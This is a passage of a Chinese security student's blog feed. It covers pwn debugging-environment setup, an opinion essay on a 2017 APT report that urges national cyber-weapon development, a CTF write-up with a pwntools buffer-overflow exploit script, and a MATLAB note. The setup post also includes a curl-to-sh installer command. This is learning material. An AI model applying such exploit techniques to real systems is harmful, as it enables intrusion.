    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Linux环境配置"><a href="#Linux环境配置" class="headerlink" title="Linux环境配置"></a>Linux环境配置</h1><blockquote><p>​    作为一个信安学习者，和环境打交道是经常的事，那么接下来为二进制学习开始做准备，配置各种架构的调试环境，提高效率。</p></blockquote><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><blockquote><p>​    zsh是一个很强大的linux终端shell工具，而oh-my-zsh是一个高效率的配置工具，通过oh-my-zsh可以很快地配置zsh，那么如何进行完整地安装呢：</p><blockquote><p>首先需要安装python的pip，然后安装zsh，再通过<code>sh -c&quot;$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)&quot;</code>命令来安装oh-my-zsh。</p><p>通过修改<code>~/.zshrc</code>里的参数，如主题<code>ZSH_THEME=&quot;random&quot;</code>来设置终端的样式。</p><p>配置zsh语法高亮，<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code>通过此命令下载插件，并按下图添加参数<code>zsh-syntax-highlighting</code>。</p><p><img src="https://i.loli.net/2018/10/14/5bc346022c416.png" alt=""></p><p>代码自动补插件下载 <code>git clone https://github.com/zsh-users/zsh-autosuggestions</code> 并放在<code>~/.oh-my-zsh/custom/plugins</code>目录下面，然后像上面一样添加参数即可</p></blockquote></blockquote><h2 id="pwn环境配置"><a href="#pwn环境配置" class="headerlink" title="pwn环境配置"></a>pwn环境配置</h2><blockquote><p>参照m4x大佬的博客<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/" target="_blank" rel="noopener">https://m4x.fun/post/how-2-pwn-an-arm-binary/</a></p><ul><li>安装 git，gdb 和 gdb-multiarch，同时安装 binfmt*用来识别文件类型</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> update$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token function">git</span> gdb gdb-multiarch$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> <span class="token string">"binfmt*"</span></code></pre><ul><li>安装 gdb 的插件 pwndbg（或者 gef 等支持多架构的插件），需要pip，pip3等模块</li></ul><pre><code>$ git clone https://github.com/pwndbg/pwndbg$ cd pwndbg</code></pre><ul><li>因为我用的是deepin安装的pwndbg（这是个坑点），所以需要对setup.sh稍作修改，如下：</li></ul><pre class=" language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span><span class="token keyword">set</span> -ex<span class="token comment" spellcheck="true"># Helper functions</span>linux<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Linux <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>osx<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">uname</span> <span class="token operator">|</span> <span class="token function">grep</span> -i Darwin <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">}</span>PYTHON<span class="token operator">=</span><span class="token string">''</span>INSTALLFLAGS<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">if</span> osx <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">==</span> <span class="token string">"--user"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--user"</span><span class="token keyword">else</span>    PYTHON<span class="token operator">=</span><span class="token string">"sudo "</span><span class="token keyword">fi</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">hash</span> gdb<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">'Could not find gdb in <span class="token variable">$PATH</span>'</span>    <span class="token keyword">exit</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Update all submodules</span><span class="token comment" spellcheck="true">#git submodule update --init --recursive</span><span class="token comment" spellcheck="true"># Find the Python version used by GDB.</span>PYVER<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import platform; print(".".join(platform.python_version_tuple()[:2]))'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import sys; print(sys.executable)'</span><span class="token punctuation">)</span>PYTHON+<span class="token operator">=</span><span class="token string">"<span class="token variable">${PYVER}</span>"</span><span class="token comment" spellcheck="true"># Find the Python site-packages that we need to use so that</span><span class="token comment" spellcheck="true"># GDB can find the files once we've installed them.</span><span class="token keyword">if</span> linux <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> -z <span class="token string">"<span class="token variable">$INSTALLFLAGS</span>"</span> <span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token keyword">then</span>    SITE_PACKAGES<span class="token operator">=</span><span class="token punctuation">$(</span>gdb -batch -q --nx -ex <span class="token string">'pi import site; print(site.getsitepackages()[0])'</span><span class="token punctuation">)</span>    INSTALLFLAGS<span class="token operator">=</span><span class="token string">"--target <span class="token variable">${SITE_PACKAGES}</span>"</span><span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Make sure that pip is available</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token variable">${PYTHON}</span> -m pip -V<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token variable">${PYTHON}</span> -m ensurepip <span class="token variable">${INSTALLFLAGS}</span> --upgrade<span class="token keyword">fi</span><span class="token comment" spellcheck="true"># Upgrade pip itself</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> --upgrade pip<span class="token comment" spellcheck="true"># Install Python dependencies</span><span class="token variable">${PYTHON}</span> -m pip <span class="token function">install</span> <span class="token variable">${INSTALLFLAGS}</span> -Ur requirements.txt<span class="token comment" spellcheck="true"># Load Pwndbg into GDB on every launch.</span><span class="token keyword">if</span> <span class="token operator">!</span> <span class="token function">grep</span> pwndbg ~/.gdbinit <span class="token operator">&amp;</span><span class="token operator">></span>/dev/null<span class="token punctuation">;</span> <span class="token keyword">then</span>    <span class="token keyword">echo</span> <span class="token string">"source <span class="token variable">$PWD</span>/gdbinit.py"</span> <span class="token operator">>></span> ~/.gdbinit<span class="token keyword">fi</span></code></pre><pre class=" language-bash"><code class="language-bash">$ ./setup.sh</code></pre><ul><li>安装qemu模拟环境</li></ul><pre class=" language-bash"><code class="language-bash">$ <span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> qemu-user</code></pre></blockquote><blockquote><p>通过 qemu 模拟 arm/mips 环境，进而进行调试 ，</p><p><img src="https://i.loli.net/2018/10/14/5bc34c058efc2.png" alt=""></p><p>运行动态的binary 需要我们查询对应架构的共享库：</p><p><code>apt-cache search &quot;libc6&quot; | grep ARCH</code> </p><p>动态链接的 bianry 需要用对应的 qemu 同时指定共享库路径，例如：</p><p><code>qemu-mipsel -L /usr/mipselbalalbala/  ./add</code></p><blockquote><p>mips（大端）和mipsel（小端）有什么区别呢，在于存储方式，一个是大端（低序存在高地址，按顺序来），一个是小端序（将低序的存在低地址，反常识来）。形象地说：大端是从上往下掉，小端是从下往上飞。</p></blockquote><p>我们只需安装类似 <strong>libc6-ARCH-cross</strong> 形式的即可 ,静态链接的 binary 直接运行即可，会自动调用对应架构的 qemu；</p><p>调试可以使用 qemu 的 -g 指定端口</p><pre class=" language-bash"><code class="language-bash">$ qemu-mipsel -g 1234 -L /usr/mipsel-linux-gnu/ ./add</code></pre><p><img src="https://i.loli.net/2018/10/14/5bc359ad27655.png" alt=""></p><p>然后使用<code>gdb-multiarch</code>进行调试，先指定架构，然后使用remote功能 </p><pre class=" language-bash"><code class="language-bash">pwndbg<span class="token operator">></span> <span class="token keyword">set</span> architecture mips <span class="token punctuation">(</span>但大多数情况下这一步可以省略, 似乎 pwndbg 能自动识别架构<span class="token punctuation">)</span>pwndbg<span class="token operator">></span> target remote localhost:1234<span class="token comment" spellcheck="true">#peda应该问题不大</span></code></pre></blockquote><blockquote><p>下载共享库存在<code>/usr/</code>目录：</p><p><img src="https://i.loli.net/2018/10/14/5bc3583d78da3.png" alt=""></p></blockquote><h2 id="开始使用pwndbg调试"><a href="#开始使用pwndbg调试" class="headerlink" title="开始使用pwndbg调试"></a>开始使用pwndbg调试</h2><blockquote><p> pwndbg正常启动（开心😄）：<img src="https://i.loli.net/2018/10/14/5bc363e61dd11.png" alt=""></p><p>设置好动态调试端口，选择好共享库：</p><p><img src="https://i.loli.net/2018/10/14/5bc364862d2ce.png" alt=""></p><p>然后用<code>gdb-multiarch</code> -q启动 pwndbg，设置好文件架构，连接端口，开始动态调试：<br><img src="https://i.loli.net/2018/10/14/5bc364ebc9a23.png" alt=""></p></blockquote><blockquote><p>​    对于静态编译的 bianry， 可以使用 lscan, flirt, rizzo, bindiff 等多种方法恢复部分符号表</p><p>加油学习吧！</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Linux环境配置&quot;&gt;&lt;a href=&quot;#Linux环境配置&quot; class=&quot;headerlink&quot; title=&quot;Linux环境配置&quot;&gt;&lt;/a&gt;Linux环境配置&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;​    作为一个信安学习者，和
      
    
    </summary>
    
      <category term="环境配置" scheme="http://www.yof3ng.xyz/categories/%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="Linux" scheme="http://www.yof3ng.xyz/tags/Linux/"/>
    
      <category term="Pwn环境配置" scheme="http://www.yof3ng.xyz/tags/Pwn%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    
      <category term="qemu" scheme="http://www.yof3ng.xyz/tags/qemu/"/>
    
  </entry>
  
  <entry>
    <title>2017APT报告研读</title>
    <link href="http://www.yof3ng.xyz/2018/10/14/2017APT%E6%8A%A5%E5%91%8A%E7%A0%94%E8%AF%BB/"/>
    <id>http://www.yof3ng.xyz/2018/10/14/2017APT报告研读/</id>
    <published>2018-10-14T04:10:47.000Z</published>
    <updated>2018-10-14T04:35:22.785Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="2017-APT-报告研读"><a href="#2017-APT-报告研读" class="headerlink" title="2017 APT 报告研读"></a>2017 APT 报告研读</h1><h2 id="APT-与网络战争中的大国博弈"><a href="#APT-与网络战争中的大国博弈" class="headerlink" title="APT 与网络战争中的大国博弈"></a>APT 与网络战争中的大国博弈</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; 为什么对APT方面的研究让美国，让中国，让世界各国开始重视起来？据数据，2017年遭受APT攻击最多的国家依次是：美国，中国，沙特，韩国、以色列、土耳其、日本、法国、俄罗斯、德国、西班牙、巴基斯坦和英国。以上这些国家，要么是经济地位领先，要么是拥有大量的能源财富，要么就是社会环境不和平，那么这一系列的因素，都成为了APT攻击的起因。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 而最受APT组织关注的领域或机构类型依次为：政府、能源、 金融、国防、互联网、航空航天、媒体、电信、医疗、化工。正如前不久发生，现在仍在白热化阶段的中美贸易战，为了国家利益而发起的贸易战争；又如朝鲜当前不稳定的社会地位，国家局势，与韩国的争端。再比如说，中东，西亚地区频繁发起的武装冲突。这一切说到的都是现实生活中的局势，但在网络世界中也一样，为了为本国取得一定的优势，网络空间中的APT组织及其活动，则与现实中的大国博弈之间呈现出很多微妙的显性联系。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 既然APT攻击很明显是与国家之间博弈有联系的，这也就能解释为什么指责他国的APT活动成为了重要的外交手段了。</p></blockquote><h2 id="我国对APT的研究应再进一步"><a href="#我国对APT的研究应再进一步" class="headerlink" title="我国对APT的研究应再进一步"></a>我国对APT的研究应再进一步</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>当今世界，在APT研究领域遥遥领先的是美国，正如各方面美国都处于霸主地位一样，APT研究也不屈居人后</strong>。而中国虽然排在第二名，但只有四个机构发布多篇APT相关研究报告，相比美国的24个机构，美国足足比我们多了六倍，可想而知，其中的各国对APT研究的重视程度也相差甚远。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>中国已经成为了最大的APT攻击受害者</strong>，很多国家面对中国的发展怀着不同的心思，有的想遏制，有的想帮扶，而想遏制的这些个国家就不停的在各方面费尽心思来对中国进行攻击。统计显示，2017年全年，这些APT组织发动的攻击行动，至少影响了中国境内超过万台电脑，攻击范围遍布国内31个省级行政区。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 在网络空间安全方面，各国几乎都是同样的起点，但却发展成了不同的水平，当前美国领先的可不仅仅是APT攻击方面，而是整个网络安全方面，所以一旦美国发起网络攻击，可以说大多数国家都是没有什么抵抗之力的。<strong>别的国家咱不管，中国，就不应该屈居人下，实现中国复兴，在各方面都应该抓紧，而网络安全，互联网安全正是不可忽视的一点。</strong></p><p>&nbsp; &nbsp; &nbsp; &nbsp; 根据报告我们也可以看出一个非常具有代表性的事实，不仅仅是APT攻击方面，拓展一下，各方面的研究人才，我们相比美国而言都是有劣势的，是大是小则不细说。是当前国情限制的吗？为什么美国就那么多研究型人才呢？就从当前大部分学生毕业等同于失业的现象来说，可能问题就出现在教育体制以及价值取向了。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>那么回到主题，我认为我国对APT攻击的研究乃至整个网络空间安全技术的研究应该加紧步伐，加强网络防御建设，培养网络攻防人才，这样才能不落人后。</strong></p></blockquote><h2 id="网络军火民用化让网络战争逐渐出现在公众眼前"><a href="#网络军火民用化让网络战争逐渐出现在公众眼前" class="headerlink" title="网络军火民用化让网络战争逐渐出现在公众眼前"></a>网络军火民用化让网络战争逐渐出现在公众眼前</h2><blockquote><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>什么是网络军火？</strong>网络军火是一种网络武器，即军火级的网络漏洞利用工具。就像去年永恒之蓝勒索蠕虫病毒（WannaCry）肆虐全球，导致150多个国家，30多万受害者遭遇勒索软件 攻击，医疗、交通、能源、教育等行业领域遭受巨大损失。WannaCry据称是美国国家安全局（NSA）旗下方程式组织（Equation Group）所开发的网络武器，是一款典型的网络军火。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; <strong>我认为网络军火需要严格把控，否则后果不堪想象。</strong> 网络军火大多由一个或者多个高精尖技术团队研发而成，而当前网络空间安全法律制度薄弱，不像现实生活中，限制枪械军火，有严格的法律来保障权益。正是如此，网络空间也就成为了许许多多龌龊苟且，黑暗邪恶事物的藏身之地。而当今各国的网络空间基本上是有防火墙相互隔绝的，也就是说，网络空间也有国界之分，那么自然而然，网络战争这种低成本高效益且隐匿的攻击方式理所当然地就上升到了国家层面。一旦网络军火民用化程度越来越高，而且网络军火的自动化程度也在变高，那么各种APT组织也就会变得更加强大，不仅仅是APT组织，很难想象几乎每个人都会用网络军火来进行攻击，而网络空间已经变成战火之地的场景。</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 网络军火严格把控的同时要发展自己的力量。据报告了解到，美国政府十分重视网络军火的研发，以及利用，拥有属于自己的网络军火库，一个是NSA旗下的方程式组织，另一个据称是美国中情局（CIA）直属的网络情报中心。根据新华社报道，截止2016 年底，CIA直属的网络情报中心拥有超过5000名员工，总共设计了超过1000个木马、病毒和其他“武器化恶意代码”。 而2017年，从特朗普政府大幅提高军事预算的政策倾向看，CIA从事网络武器库开发人员数量会大幅增加。 而上述的这些，都是美国的网络军火力量。试问，如果美国的网络军火我们都扛不住，如何去抵抗现实生活中的战争？这不是未战先垮吗？</p><p>&nbsp; &nbsp; &nbsp; &nbsp; 总之，网络军火级工具和普通的恶意软件、渗透工具等结合后，让很多 攻击行为同时具备高级攻击手段和一般手段的特性，增加了犯罪分子的隐蔽性，也会干扰监测识别高级威胁。 <strong>所以，某种程度上，网络军火民用化抬升了安全研究者的门槛，增加了APT的防控难度，网络安全企业任重道远。我国在研究如何抵抗这种网络军火攻击的同时，也应该也加大网络军火的研发力度，一味的防守只会让自己处于被动的状态，只有自己也拥有能够威胁到敌方的力量，才能护我国和平发展之路。</strong></p></blockquote><hr><blockquote><p> 以上仅属个人观点，若有不符，还望斧正。</p></blockquote><p>参考：</p><p><a href="https://ti.360.net/blog/articles/apt-report-of-2017/" target="_blank" rel="noopener">2017中国高级持续性威胁（APT）研究报告 </a></p><p><a href="http://cpc.people.com.cn/xuexi/n1/2018/0817/c385476-30234135.html" target="_blank" rel="noopener">习近平谈网络安全：没有网络安全就没有国家安全</a></p><p><a href="https://www.doit.com.cn/p/251027.html" target="_blank" rel="noopener">肖新光：APT的本质是大国博弈，我们生与斯，长与斯，不义之财我们分文不取，祖宗之地我们寸土不让</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;2017-APT-报告研读&quot;&gt;&lt;a href=&quot;#2017-APT-报告研读&quot; class=&quot;headerlink&quot; title=&quot;2017 APT 报告研读&quot;&gt;&lt;/a&gt;2017 APT 报告研读&lt;/h1&gt;&lt;h2 id=&quot;APT-与网络战
      
    
    </summary>
    
      <category term="杂文" scheme="http://www.yof3ng.xyz/categories/%E6%9D%82%E6%96%87/"/>
    
    
      <category term="APT" scheme="http://www.yof3ng.xyz/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>Pwn-10月14-护网杯</title>
    <link href="http://www.yof3ng.xyz/2018/10/13/Pwn-10%E6%9C%8814-%E6%8A%A4%E7%BD%91%E6%9D%AF/"/>
    <id>http://www.yof3ng.xyz/2018/10/13/Pwn-10月14-护网杯/</id>
    <published>2018-10-13T15:05:58.000Z</published>
    <updated>2018-10-15T08:48:50.035Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="Pwn-10-13"><a href="#Pwn-10-13" class="headerlink" title="Pwn-10/13"></a>Pwn-10/13</h1><blockquote><p>​    今天打了护网杯，从之前的强网杯，到国赛，到铁三，到Xman，再到网鼎杯，最后到了今天的护网杯，经历的比赛倒是挺多，只是进步微乎其微，实在汗颜，希望接下来能有较大的进步！</p><p>​    write-up友链：<a href="https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/" target="_blank" rel="noopener">https://supery4ng.github.io/2018/10/14/%E6%8A%A4%E7%BD%91%E6%9D%AFWP/</a></p><p>​    护网杯关键词：<code>python tornado模板注入(STTI)</code>,<code>条件竞争</code>,<code>辣条</code>,<code>溢出</code>,<code>自闭</code></p></blockquote><h2 id="gettingstart"><a href="#gettingstart" class="headerlink" title="gettingstart"></a>gettingstart</h2><blockquote><p>​    这相当于今天pwn的签到题，简单但详细地复原一下：</p><p>​    第一步，IDA看一看，逻辑十分简单，甚至可以直接写payload：</p><p><img src="https://i.loli.net/2018/10/13/5bc20e49c32cb.png" alt=""></p><p>​    突破点是通过read函数，在buf处进行溢出，进而覆盖v7，v8的值，达到else的条件，即v7==0x7FFFFFFFFFFFFFFF,v8==0.1。</p><p>​    这里我们需要知道的是，浮点数在内存中表现的形式是什么样子的，它与普通的整型不同，会做出转换，比较晦涩。这里简单写一个C语言程序看看0.1是怎么表示的：</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">double</span> a<span class="token operator">=</span><span class="token number">0.1</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%lf"</span><span class="token punctuation">,</span>a<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>​    通过<code>gcc -o test test.c -z noexecstack -no-pie</code>进行编译，然后使用gdb看看：</p><p><img src="https://i.loli.net/2018/10/13/5bc213eed9cfc.png" alt=""></p><p>​    显而易见，0.1是用0x3fb999999999999a表示的，那么在接下来的exp中就应该这样写:</p><pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./task"</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p=remote("117.78.26.114",31498)</span>payload<span class="token operator">=</span><span class="token string">""</span>payload<span class="token operator">+=</span><span class="token string">"A"</span><span class="token operator">*</span><span class="token number">24</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x7FFFFFFFFFFFFFFF</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x3FB999999999999A</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#cmd="cat flag"</span><span class="token comment" spellcheck="true">#print p.recv()</span><span class="token comment" spellcheck="true">#print payload</span>p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">print</span> p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#p.send(cmd)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#print p.recv()</span></code></pre><p>运行exp，效果图：</p><p><img src="https://i.loli.net/2018/10/13/5bc214f6668a4.png" alt=""></p></blockquote><h2 id="验证数组越界"><a href="#验证数组越界" class="headerlink" title="验证数组越界"></a>验证数组越界</h2><blockquote><p>​    写一段简单的代码来验证一下，新生经常会犯错的数组越界问题</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">;</span>        a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>​    运行结果：</p><p><img src="https://i.loli.net/2018/10/14/5bc299e356904.png" alt=""></p><p>​    因为a[4]并不在我们定义的数组范围，属于数组越界，接下来调试一下看看具体情况：</p><p><img src="https://i.loli.net/2018/10/14/5bc2998608bee.png" alt=""></p><p>​    而就在0，1，2，3后面是不是我们运行输出的那个值呢？正是如此，因为我们通过a[4]访问的并不是我们曾经定义过的元素，而是程序运行中的产生的随机值，如函数地址等。</p></blockquote><h2 id="验证int溢出"><a href="#验证int溢出" class="headerlink" title="验证int溢出"></a>验证int溢出</h2><blockquote><p>​    在64位系统中 <code>int</code>型变量是占用4个字节大小的，而4个字节用16进制表示就是<code>0x00000000-0xffffffff</code>，并且正数负数都在其中，而负数是用补码表示的，<code>0x7fffffff&lt;=&gt;2147483647</code>，<code>0x80000000=2147483648&lt;=&gt;-2147483648</code>。</p><pre class=" language-c"><code class="language-c"><span class="token macro property">#<span class="token directive keyword">include</span><span class="token string">&lt;stdio.h></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> i<span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"四个字节最大值0x7fffffff十进制为:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\n"</span><span class="token punctuation">,</span><span class="token number">0x7fffffff</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"请输入你想要赋给int的值:\n"</span><span class="token punctuation">)</span>        <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span></code></pre><p>运行结果：</p><p><img src="https://i.loli.net/2018/10/14/5bc29c77aa16d.png" alt=""></p><p>​    果不其然，我们赋给int的2147483648变成了负数，-2147483648。</p><p><img src="https://i.loli.net/2018/10/14/5bc29d54a35a3.png" alt=""></p></blockquote><blockquote><p>have a good weekend everybody!</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[TOC]&lt;/p&gt;
&lt;h1 id=&quot;Pwn-10-13&quot;&gt;&lt;a href=&quot;#Pwn-10-13&quot; class=&quot;headerlink&quot; title=&quot;Pwn-10/13&quot;&gt;&lt;/a&gt;Pwn-10/13&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;​    今天打了护网杯，从之前
      
    
    </summary>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/categories/CTF/"/>
    
    
      <category term="Pwn" scheme="http://www.yof3ng.xyz/tags/Pwn/"/>
    
      <category term="CTF" scheme="http://www.yof3ng.xyz/tags/CTF/"/>
    
      <category term="二进制安全" scheme="http://www.yof3ng.xyz/tags/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>数学建模-day5</title>
    <link href="http://www.yof3ng.xyz/2018/10/13/%E6%95%B0%E5%AD%A6%E5%BB%BA%E6%A8%A1-day5/"/>
    <id>http://www.yof3ng.xyz/2018/10/13/数学建模-day5/</id>
    <published>2018-10-13T12:47:53.000Z</published>
    <updated>2018-10-13T13:32:00.895Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="数学建模-day5-线性代数"><a href="#数学建模-day5-线性代数" class="headerlink" title="数学建模_day5 - 线性代数"></a>数学建模_day5 - 线性代数</h1><blockquote><p>​    线性代数相信大家都学过哒，基本是大学的理科必修课，而线性代数常用于工程数学，自然而然就和数学建模有很大的关系啦，今天学习一下用matlab做一些相关的线性代数学习。</p></blockquote><h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><blockquote><p>​    MATLAB 提供了许多函数，用于创建各种类型的矩阵。例如，你就可以使用基于帕斯卡三角形的项创建一个对称矩阵： </p></blockquote><pre class=" language-matlab"><code class="language-matlab">A <span class="token operator">=</span> <span class="token function">pascal</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span>#虚线下为运行结果A <span class="token operator">=</span>       <span class="token number">1</span>     <span class="token number">1</span>     <span class="token number">1</span>       <span class="token number">1</span>     <span class="token number">2</span>     <span class="token number">3</span>       <span class="token number">1</span>     <span class="token number">3</span>     <span class="token number">6</span></code></pre><blockquote><p>我们也可以创建一个非对称<em>幻方矩阵</em>，它的行总和与列总和相等： </p></blockquote><pre class=" language-matlab"><code class="language-matlab">B <span class="token operator">=</span> <span class="token function">magic</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">-</span><span class="token 